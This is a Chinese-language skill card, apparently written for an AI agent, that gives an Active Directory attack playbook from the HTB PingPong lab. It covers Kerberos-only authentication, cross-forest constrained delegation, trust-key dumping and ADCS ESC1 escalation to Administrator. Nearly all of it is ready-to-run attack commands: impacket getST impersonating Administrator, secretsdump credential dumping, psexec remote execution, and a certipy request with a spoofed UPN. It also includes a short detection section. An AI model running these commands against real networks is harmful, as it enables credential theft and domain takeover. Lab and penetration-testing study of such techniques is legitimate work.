---
name: 'kerberos-only-ad'
description: 'Kerberos-Only / No-NTLM AD 范式：AES256-only、时钟偏差、跨林委派。来源PingPong Hard靶机'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

# Kerberos-Only / No-NTLM AD 范式

> 来自 HTB PingPong (Hard/Insane, Season 10 Final Week)。双林跨域、双向信任、NTLM 全禁用、RC4 禁用。

## 环境信号识别

```bash
# 信号1：NTLM 认证全失败
nxc smb dc01.ping.htb -u user -p pass     # → STATUS_LOGON_FAILURE
nxc smb dc01.ping.htb -u '' -p ''         # → null session 也失败
evil-winrm -i dc01.ping.htb -u user -p pass # → access denied

# 信号2：Kerberos 认证有效
impacket-getTGT ping.htb/user:'pass' -dc-ip dc01.ping.htb  # ✅ 成功
nxc smb dc01.ping.htb -k --use-kcache                       # ✅ 成功

# 信号3：RC4 被禁（PONG.HTB）
impacket-getTGT -aesKey <aes256> pong.htb/user   # 必须用 AES256
```text

## 强制 Kerberos 工具链（无 NTLM fallback）

```bash
# ❌ 这些默认用 NTLM fallback → 会静默失败
impacket-psexec domain/user:pass@dc
evil-winrm -i dc -u user -p pass

# ✅ 必须显式传 Kerberos 参数
# 获取 TGT
impacket-getTGT domain/user:'pass' -dc-ip <DC_IP>
export KRB5CCNAME=user.ccache

# 用 TGT 认证所有后续操作
impacket-psexec -k -no-pass domain/user@dc
impacket-secretsdump -k -no-pass domain/user@dc
evil-winrm -i dc -u user -p pass -k  # 或 --spn
nxc smb dc -k --use-kcache

# AES256-only 环境
impacket-getTGT domain/user -hashes :<NT> -aesKey <aes256>
impacket-getST -spn 'svc/host' -k -no-pass -aesKey <aes256>
```text

## 时钟偏差 — #1 无声杀手

```bash
# 症状：getTGT 成功但 getST 失败 "Clock skew too great"
# 原因：HTB 靶机常不跟 UTC 同步

# 每台 DC 单独同步
sudo ntpdate -bu dc1.ping.htb
sudo rdate -np dc1.ping.htb

# per-command 方案
faketime "$(rdate -p dc1.ping.htb)" impacket-getTGT ...
faketime "$(date -d @$(rdate -p dc1.ping.htb | cut -d. -f1))" impacket-getST ...

# 检查偏差
sudo ntpdate -qu dc1.ping.htb
```text

## 跨林委派 + Trust

```bash
# 枚举跨林信任
nltest /domain_trusts
bloodhound-python -d ping.htb -dc dc1 -u user -p pass -c All
# 看 Trusted Domains 节点 → 双向信任

# 枚举跨林可委派的服务
Get-DomainUser -TrustedToAuth -Domain pong.htb
Get-DomainComputer -TrustedToAuth -Domain pong.htb

# 跨林 S4U2Self + S4U2Proxy
impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' \
  -impersonate Administrator -dc-ip dc1.ping.htb \
  ping.htb/svc_sql -k -no-pass -aesKey <aes256>

# 跨林 referral TGT 会自动生成
# ST 到达 PONG.HTB → 可执行远程命令
```text

## 跨林后的回归路径（PingPong 特色）

```bash
# 从 pong.htb DC → 提取跨林 trust key
impacket-secretsdump -k -no-pass dc2.pong.htb
# → PONG.HTB$ / PING.HTB$ 的 trust 密钥

# 用 trust key 伪造成 ping.htb 的 TGT
# 回到 ping.htb → ADCS ESC1 → Administrator
certipy req -u svc@ping.htb -hashes :<NT> \
  -ca PING-CA -template VulnTemplate \
  -upn Administrator@ping.htb -dc-ip dc1.ping.htb
certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
```text

## 工具兼容性表

| 工具 | No-NTLM 兼容 | AES256 兼容 | 注意事项 |
|------|-------------|-------------|---------|
| impacket-getTGT | ✅ | ✅ `-aesKey` | 必须加 `-k` 到后续命令 |
| impacket-getST | ✅ | ✅ `-aesKey` | S4U 链也需要 `-k` |
| impacket-psexec | ✅ `-k` | ✅ | 默认 `-hashes` 走 NTLM，不可用 |
| impacket-secretsdump | ✅ `-k -no-pass` | ✅ | 跨林 DCSync 需要 trust key |
| evil-winrm | ⚠️ | ❌ 不直接支持 | 需要 TGT 注入或用 psexec 替代 |
| nxc smb | ✅ `-k --use-kcache` | ⚠️ | `--aesKey` 支持有限 |
| bloodhound-python | ✅ | ✅ | 纯 LDAP(Kerberos)，无 NTLM 问题 |
| certipy | ✅ `-k` | ✅ | PKINIT auth 天然 Kerberos |
| Rubeus | ✅ `/aes256:` | ✅ | Windows 原生 Kerberos |
| Rubeus s4u | ✅ | ✅ | `/altservice:` 用于 SPN jacking |

## 检测特征

- 零 NTLM 认证尝试（4625 with NTLM package）— 高度异常的正常环境
- 跨林 referral TGT 请求 → `msDS-CrossDomainAccountInfo` set
- AES256-only → 无 RC4-HMAC 类型的 TGT 请求（4768 TicketEncryptionType=18）
- 多 DC 之间的 Kerberos 流量突发

## 教训

- **No-NTLM 是 AD 的未来** — 默认 fallback 到 NTLM 的工具都会坏
- **永远在 getTGT 后用 `-k -no-pass`，不要假设 `-hashes` 永远可退**
- **时钟偏差：Kerberos 的 #1 无声故障源** — 每步操作前确认时间
- **跨林 constrained delegation 是 "无需 Golden Ticket 的 Golden Ticket"**
- **RC4 禁用 = AES256-only** — `-aesKey` 变为必需，NT hash 对 TGT 无效
